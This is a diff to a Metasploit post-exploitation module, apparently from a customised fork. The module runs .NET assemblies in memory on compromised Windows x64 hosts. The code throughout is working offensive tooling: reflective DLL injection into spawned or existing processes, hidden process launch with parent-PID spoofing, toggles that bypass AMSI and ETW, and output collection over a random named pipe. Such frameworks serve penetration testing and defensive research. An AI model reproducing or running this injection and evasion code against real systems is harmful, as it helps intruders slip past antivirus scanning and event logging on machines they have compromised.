@@ -7,62 +7,86 @@ require 'base64'
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
+  include Msf::Exploit::Retry
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
   include Msf::Post::Windows::ReflectiveDLLInjection
   include Msf::Post::Windows::Dotnet
 
-  SIGNATURES = {
-          'Main()'         => 1,
-          'Main(string[])' => 2
-  }.freeze
-
   def initialize(info = {})
     super(
-            update_info(
-                    info,
-                    'Name'          => 'Execute .net Assembly (x64 only)',
-                    'Description'   => %q{
-          This module executes a .net assembly in memory. It
+      update_info(
+        info,
+        'Name' => 'Execute .net Assembly (x64 only)',
+        'Description' => %q{
+          This module executes a .NET assembly in memory. It
           reflectively loads a dll that will host CLR, then it copies
-          the assembly to be executed into memory. Credits for Amsi
+          the assembly to be executed into memory. Credits for AMSI
           bypass to Rastamouse (@_RastaMouse)
         },
-                    'License'       => MSF_LICENSE,
-                    'Author'        => 'b4rtik',
-                    'Arch'          => [ARCH_X64],
-                    'Platform'      => 'win',
-                    'SessionTypes'  => ['meterpreter'],
-                    'Targets'       => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
-                    'References'    => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
-                    'DefaultTarget' => 0
-            )
+        'License' => MSF_LICENSE,
+        'Author' => 'b4rtik',
+        'Arch' => [ARCH_X64],
+        'Platform' => 'win',
+        'SessionTypes' => ['meterpreter'],
+        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }]],
+        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
+        'DefaultTarget' => 0,
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_process_attach
+              stdapi_sys_process_execute
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_kill
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_write
+              stdapi_sys_process_thread_create
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
     )
+    spawn_condition = ['TECHNIQUE', '==', 'SPAWN_AND_INJECT']
+    inject_condition = ['TECHNIQUE', '==', 'INJECT']
+
     register_options(
-            [
-                    OptString.new('ASSEMBLY', [true, 'Assembly file name']),
-                    OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-                    OptEnum.new('Signature', [true, 'The Main function signature', 'Automatic', ['Automatic'] + SIGNATURES.keys]),
-                    OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
-                    OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
-                    OptInt.new('PID', [false, 'Pid  to inject', 0]),
-                    OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
-                    OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
-                    OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
-                    OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
-            ], self.class
+      [
+        OptEnum.new('TECHNIQUE', [true, 'Technique for executing assembly', 'SELF', ['SELF', 'INJECT', 'SPAWN_AND_INJECT']]),
+        OptString.new('DOTNET_EXE', [true, 'Assembly file name']),
+        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
+        OptBool.new('AMSIBYPASS', [true, 'Enable AMSI bypass', true]),
+        OptBool.new('ETWBYPASS', [true, 'Enable ETW bypass', true]),
+
+        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe'], conditions: spawn_condition),
+        OptBool.new('USETHREADTOKEN', [false, 'Spawn process using the current thread impersonation', true], conditions: spawn_condition),
+        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process (no PPID spoofing if unset)', nil], conditions: spawn_condition),
+
+        OptInt.new('PID', [false, 'PID to inject into', nil], conditions: inject_condition),
+        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10]),
+      ], self.class
     )
 
     register_advanced_options(
-            [
-                    OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
-            ]
+      [
+        OptBool.new('KILL', [true, 'Kill the launched process at the end of the task', true], conditions: spawn_condition)
+      ]
     )
+
+    self.terminate_process = false
+    self.hprocess = nil
+    self.handles_to_close = []
   end
 
   def find_required_clr(exe_path)
     filecontent = File.read(exe_path).bytes
-    sign        = 'v4.0.30319'.bytes
+    sign = 'v4.0.30319'.bytes
     filecontent.each_with_index do |_item, index|
       sign.each_with_index do |subitem, indexsub|
         break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
@@ -84,23 +108,25 @@ class MetasploitModule < Msf::Post
           vprint_status('Requirements ok')
           return true
         end
-      elsif fi[0] == '3'
-        vprint_status('Requirements ok')
-        return true
+      elsif clr_req == 'v2.0.50727'
+        if fi[0] == '3' || fi[0] == '2'
+          vprint_status('Requirements ok')
+          return true
+        end
       end
     end
-    print_error('Required dotnet version not present')
+    print_error_redis('Required dotnet version not present')
     false
   end
 
   def run
-    if File.file?(File.join(Msf::Config.loot_directory, datastore['ASSEMBLY']))
-      exe_path = File.join(Msf::Config.loot_directory, datastore['ASSEMBLY'])
-    elsif File.file?(datastore['ASSEMBLY'])
-      exe_path = datastore['ASSEMBLY']
+    if File.file?(File.join(Msf::Config.loot_directory, datastore['DOTNET_EXE']))
+      exe_path = File.join(Msf::Config.loot_directory, datastore['DOTNET_EXE'])
+    elsif File.file?(datastore['DOTNET_EXE'])
+      exe_path = datastore['DOTNET_EXE']
     else
       pub_json_result(false,
-                      "#{datastore['ASSEMBLY']} not found",
+                      "#{datastore['DOTNET_EXE']} not found",
                       nil,
                       self.uuid)
       return
@@ -123,7 +149,31 @@ class MetasploitModule < Msf::Post
                       self.uuid)
       return
     end
-    execute_assembly(exe_path)
+
+    if sysinfo.nil?
+      pub_json_result(false,
+                      'Session invalid',
+                      nil,
+                      self.uuid)
+    else
+      print_status_redis("Running module against #{sysinfo['Computer']}")
+    end
+
+    execute_assembly(exe_path, rclr)
+  end
+
+  def cleanup
+    if terminate_process && !hprocess.nil? && !hprocess.pid.nil?
+      print_good_redis("Killing process #{hprocess.pid}")
+      begin
+        client.sys.process.kill(hprocess.pid)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_warning_redis("Error while terminating process: #{e}")
+        print_warning_redis('Process may already have terminated')
+      end
+    end
+
+    handles_to_close.each(&:close)
   end
 
   def sanitize_process_name(process_name)
@@ -136,16 +186,9 @@ class MetasploitModule < Msf::Post
   end
 
   def pid_exists(pid)
-    mypid = client.sys.process.getpid.to_i
-
-    if pid == mypid
-      print_bad('Cannot select the current process as the injection target')
-      return false
-    end
-
     host_processes = client.sys.process.get_processes
     if host_processes.empty?
-      print_bad('No running processes found on the target host.')
+      print_error_redis('No running processes found on the target host.')
       return false
     end
 
@@ -155,196 +198,284 @@ class MetasploitModule < Msf::Post
   end
 
   def launch_process
-    if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
-      print_error("Process #{datastore['PPID']} was not found")
-      return false
-    elsif datastore['PPID'] != 0
-      print_status("Spoofing PPID #{datastore['PPID']}")
+    if datastore['PROCESS'].nil?
+      pub_json_result(false,
+                      'Spawn and inject selected, but no process was specified',
+                      nil,
+                      self.uuid)
+      fail_with(Failure::BadConfig, 'Spawn and inject selected, but no process was specified')
+
     end
+
+    ppid_selected = datastore['PPID'] != 0 && !datastore['PPID'].nil?
+    if ppid_selected && !pid_exists(datastore['PPID'])
+      pub_json_result(false,
+                      "Process #{datastore['PPID']} was not found",
+                      nil,
+                      self.uuid)
+      fail_with(Failure::BadConfig, "Process #{datastore['PPID']} was not found")
+    elsif ppid_selected
+      print_status_redis("Spoofing PPID #{datastore['PPID']}")
+    end
+
     process_name = sanitize_process_name(datastore['PROCESS'])
-    print_status("Launching #{process_name} to host CLR...")
-    channelized = true
-    channelized = false if datastore['PID'].positive?
+    print_status_redis("Launching #{process_name} to host CLR...")
 
-    impersonation = true
-    impersonation = false if datastore['USETHREADTOKEN'] == false
+    begin
+      process = client.sys.process.execute(process_name, nil, {
+        'Channelized' => false,
+        'Hidden' => true,
+        'UseThreadToken' => !(!datastore['USETHREADTOKEN']),
+        'ParentPid' => datastore['PPID']
+      })
+      hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      pub_json_result(false,
+                      "Unable to launch process: #{e}",
+                      nil,
+                      self.uuid)
+      fail_with(Failure::BadConfig, "Unable to launch process: #{e}")
+    end
 
-    process  = client.sys.process.execute(process_name, nil, {
-            'Channelized'    => channelized,
-            'Hidden'         => true,
-            'UseThreadToken' => impersonation,
-            'ParentPid'      => datastore['PPID']
-    })
-    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
-    print_good("Process #{hprocess.pid} launched.")
-    [process, hprocess]
+    print_good_redis("Process #{hprocess.pid} launched.")
+    hprocess
   end
 
   def inject_hostclr_dll(process)
-    print_status("Reflectively injecting the Host DLL into #{process.pid}..")
+    print_status_redis("Reflectively injecting the Host DLL into #{process.pid}..")
 
     library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
     library_path = ::File.expand_path(library_path)
 
-    print_status("Injecting Host into #{process.pid}...")
-    exploit_mem, offset = inject_dll_into_process(process, library_path)
-    [exploit_mem, offset]
+    print_status_redis("Injecting Host into #{process.pid}...")
+    # Memory management note: this memory is freed by the C++ code itself upon completion
+    # of the assembly
+    inject_dll_into_process(process, library_path)
   end
 
-  def open_process
-    pid = datastore['PID'].to_i
+  def open_process(pid)
+    if (pid == 0) || pid.nil?
+      pub_json_result(false,
+                      'Inject technique selected, but no PID set',
+                      nil,
+                      self.uuid)
+      fail_with(Failure::BadConfig, 'Inject technique selected, but no PID set')
+    end
 
     if pid_exists(pid)
-      print_status("Opening handle to process #{datastore['PID']}...")
-      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
-      print_good('Handle opened')
-      [nil, hprocess]
+      print_status_redis("Opening handle to process #{pid}...")
+      begin
+        hprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        pub_json_result(false,
+                        "Unable to access process #{pid}: #{e}",
+                        nil,
+                        self.uuid)
+        fail_with(Failure::BadConfig, "Unable to access process #{pid}: #{e}")
+      end
+      print_good_redis('Handle opened')
+      hprocess
     else
-      print_bad('Pid not found')
-      [nil, nil]
-    end
-  end
-
-  def execute_assembly(exe_path)
-    if sysinfo.nil?
       pub_json_result(false,
-                      'Session invalid',
+                      'PID not found',
                       nil,
                       self.uuid)
-      return
-    else
-      print_status_redis("Running module against #{sysinfo['Computer']}")
+      fail_with(Failure::BadConfig, 'PID not found')
     end
-    if datastore['PID'].positive? || datastore['WAIT'].zero? || datastore['PPID'].positive?
-      print_warning_redis('Output unavailable')
-    end
+  end
 
-    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
+  def check_process_suitability(pid)
+    process = session.sys.process.each_process.find { |i| i['pid'] == pid }
+    if process.nil?
       pub_json_result(false,
-                      'PID and PPID are mutually exclusive',
+                      'PID not found',
                       nil,
                       self.uuid)
-      return false
+      fail_with(Failure::BadConfig, 'PID not found')
     end
 
-    if datastore['PID'] <= 0
-      process, hprocess = launch_process
-    else
-      process, hprocess = open_process
-    end
+    arch = process['arch']
 
-    exploit_mem, offset = inject_hostclr_dll(hprocess)
-
-    assembly_mem = copy_assembly(exe_path, hprocess)
-
-    print_status('Executing...')
-    hprocess.thread.create(exploit_mem + offset, assembly_mem)
-
-    sleep(datastore['WAIT']) if datastore['WAIT'].positive?
-
-    if (datastore['PID'] <= 0) && datastore['WAIT'].positive? && (datastore['PPID'] <= 0)
-      output = get_exe_output(process)
-
-      pub_json_result(true,
+    if arch != ARCH_X64
+      pub_json_result(false,
+                      'execute_dotnet_assembly currently only supports x64 processes',
                       nil,
-                      Base64.encode64(output),
                       self.uuid)
-    else
-      pub_json_result(true,
-                      nil,
-                      Base64.encode64("Run finish and do not read output"),
-                      self.uuid)
-      print_good('Execution finished.')
+      fail_with(Failure::BadConfig, 'execute_dotnet_assembly currently only supports x64 processes')
     end
-
-    if datastore['KILL']
-      print_good("Killing process #{hprocess.pid}")
-      client.sys.process.kill(hprocess.pid)
-    end
-
-    print_good('Execution finished.')
   end
 
-  def copy_assembly(exe_path, process)
-    print_status("Host injected. Copy assembly into #{process.pid}...")
-    int_param_size = 8
-    sign_flag_size = 1
-    amsi_flag_size = 1
-    etw_flag_size  = 1
-    assembly_size  = File.size(exe_path)
-
-    cln_params = ''
-    if datastore['Signature'] == 'Automatic'
-      signature = SIGNATURES['Main(string[])']
-      #signature = datastore['ARGUMENTS'].blank? ? SIGNATURES['Main()'] : SIGNATURES['Main(string[])']
+  def execute_assembly(exe_path, clr_version)
+    if datastore['TECHNIQUE'] == 'SPAWN_AND_INJECT'
+      self.hprocess = launch_process
+      self.terminate_process = datastore['KILL']
+      check_process_suitability(hprocess.pid)
     else
-      signature = SIGNATURES.fetch(datastore['Signature'])
+      if datastore['TECHNIQUE'] == 'INJECT'
+        inject_pid = datastore['PID']
+      elsif datastore['TECHNIQUE'] == 'SELF'
+        inject_pid = client.sys.process.getpid
+      end
+      check_process_suitability(inject_pid)
+
+      self.hprocess = open_process(inject_pid)
     end
-    cln_params << datastore['ARGUMENTS'] if signature == SIGNATURES['Main(string[])']
-    cln_params << "\x00"
 
-    payload_size = amsi_flag_size + etw_flag_size + sign_flag_size + int_param_size
-    payload_size += assembly_size + cln_params.length
-    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
-    params       = [
-            assembly_size,
-            cln_params.length,
-            datastore['AMSIBYPASS'] ? 1 : 0,
-            datastore['ETWBYPASS'] ? 1 : 0,
-            signature
-    ].pack('IICCC')
-    params       += cln_params
-
-    process.memory.write(assembly_mem, params + File.read(exe_path))
-    print_status_redis('Assembly copied.')
-    assembly_mem
-  end
-
-  def read_output(process)
-    print_status('Start reading output')
-    old_timeout             = client.response_timeout
-    client.response_timeout = 5
+    handles_to_close.append(hprocess)
 
     begin
+      exploit_mem, offset = inject_hostclr_dll(hprocess)
+
+      pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
+      pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
+      appdomain_name = Rex::Text.rand_text_alpha(9)
+      vprint_status("Connecting with CLR via #{pipe_name}")
+      vprint_status("Running in new AppDomain: #{appdomain_name}")
+      assembly_mem = copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, hprocess)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      pub_json_result(false,
+                      "Error while allocating memory: #{e}",
+                      nil,
+                      self.uuid)
+      fail_with(Failure::PayloadFailed, "Error while allocating memory: #{e}")
+    end
+
+    print_status_redis('Executing...')
+    begin
+      thread = hprocess.thread.create(exploit_mem + offset, assembly_mem)
+      handles_to_close.append(thread)
+
+      pipe = nil
+      retry_until_truthy(timeout: datastore['WAIT']) do
+        pipe = client.fs.file.open(pipe_name)
+        true
+      rescue Rex::Post::Meterpreter::RequestError => e
+        if e.code != Msf::WindowsError::FILE_NOT_FOUND
+          # File not found is expected, since the pipe may not be set up yet.
+          # Any other error would be surprising.
+          vprint_error("Error while attaching to named pipe: #{e.inspect}")
+        end
+        false
+      end
+
+      if pipe.nil?
+        pub_json_result(false,
+                        'Unable to connect to output stream',
+                        nil,
+                        self.uuid)
+        fail_with(Failure::PayloadFailed, 'Unable to connect to output stream')
+      end
+
+      basename = File.basename(datastore['DOTNET_EXE'])
+      dir = Msf::Config.log_directory + File::SEPARATOR + 'dotnet'
+      unless Dir.exist?(dir)
+        Dir.mkdir(dir)
+      end
+      logfile = dir + File::SEPARATOR + "log_#{basename}_#{Time.now.strftime('%Y%m%d%H%M%S')}"
+      read_output(pipe, logfile)
+      # rubocop:disable Lint/RescueException
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::PayloadFailed, e.message)
+      pub_json_result(false,
+                      e.message,
+                      nil,
+                      self.uuid)
+    rescue ::Exception => e
+      # rubocop:enable Lint/RescueException
+      unless terminate_process
+        # We don't provide a trigger to the assembly to self-terminate, so it will continue on its merry way.
+        # Because named pipes don't have an infinite buffer, if too much additional output is provided by the
+        # assembly, it will block until we read it. So it could hang at an unpredictable location.
+        # Also, since we can't confidently clean up the memory of the DLL that may still be running, there
+        # will also be a memory leak.
+
+        reason = 'terminating due to exception'
+        if e.is_a?(::Interrupt)
+          reason = 'interrupted'
+        end
+        print_warning_redis("Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.")
+        pub_json_result(false,
+                        "Execution #{reason}. Assembly may still be running. However, as we are no longer retrieving output, it may block at an unpredictable location.",
+                        nil,
+                        self.uuid)
+      end
+
+      raise
+    end
+
+    print_good_redis('Execution finished.')
+  end
+
+  def copy_assembly(pipe_name, appdomain_name, clr_version, exe_path, process)
+    print_status("Host injected. Copy assembly into #{process.pid}...")
+    # Structure:
+    # - Packed metadata (string/data lengths, flags)
+    # - Pipe Name
+    # - Appdomain Name
+    # - CLR Version
+    # - Param data
+    # - Assembly data
+    assembly_size = File.size(exe_path)
+
+    cln_params = ''
+    cln_params << datastore['ARGUMENTS'] unless datastore['ARGUMENTS'].nil?
+    cln_params << "\x00"
+
+    pipe_name = pipe_name.encode(::Encoding::ASCII_8BIT)
+    appdomain_name = appdomain_name.encode(::Encoding::ASCII_8BIT)
+    clr_version = clr_version.encode(::Encoding::ASCII_8BIT)
+    params = [
+      pipe_name.bytesize,
+      appdomain_name.bytesize,
+      clr_version.bytesize,
+      cln_params.length,
+      assembly_size,
+      datastore['AMSIBYPASS'] ? 1 : 0,
+      datastore['ETWBYPASS'] ? 1 : 0,
+    ].pack('IIIIICC')
+
+    payload = params
+    payload += pipe_name
+    payload += appdomain_name
+    payload += clr_version
+    payload += cln_params
+    payload += File.read(exe_path)
+
+    payload_size = payload.length
+
+    # Memory management note: this memory is freed by the C++ code itself upon completion
+    # of the assembly
+    allocated_memory = process.memory.allocate(payload_size, PROT_READ | PROT_WRITE)
+    process.memory.write(allocated_memory, payload)
+    print_status_redis('Assembly copied.')
+    allocated_memory
+  end
+
+  def read_output(pipe, logfilename)
+    print_status_redis('Start reading output')
+
+    print_status_redis("Writing output to #{logfilename}")
+    logfile = File.open(logfilename, 'wb+')
+    output_all = "".b
+    begin
       loop do
-        output = process.channel.read
+        output = pipe.read(1024)
         if !output.nil? && !output.empty?
-          output.split("\n").each { |x| print_good(x) }
+          logfile.write(output)
+          output_all = output_all + output
         end
         break if output.nil? || output.empty?
       end
-    rescue Rex::TimeoutError => _e
-      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
     rescue ::StandardError => e
-      print_error("Exception: #{e.inspect}")
+      print_error_redis("Exception: #{e.inspect}")
     end
-
-    client.response_timeout = old_timeout
-    print_status('End output.')
+    pub_json_result(true,
+                    nil,
+                    Base64.encode64(output_all),
+                    self.uuid)
+    logfile.close
+    print_status_redis('End output.')
   end
 
-  def get_exe_output(process)
-    output = ""
-    print_status('Start reading output')
-    old_timeout             = client.response_timeout
-    client.response_timeout = datastore['WAIT']
-    begin
-      loop do
-        tmp = process.channel.read
-        if !tmp.nil? && !tmp.empty?
-          output = output + tmp
-        else
-          break
-        end
-      end
-    rescue ::Exception => e
-      #print_status("Error running assemply: #{e.class} #{e}")
-    end
-    client.response_timeout = old_timeout
-    print_status('End output.')
-    print(output)
-    output
-  end
-
-
+  attr_accessor :terminate_process, :hprocess, :handles_to_close
 end
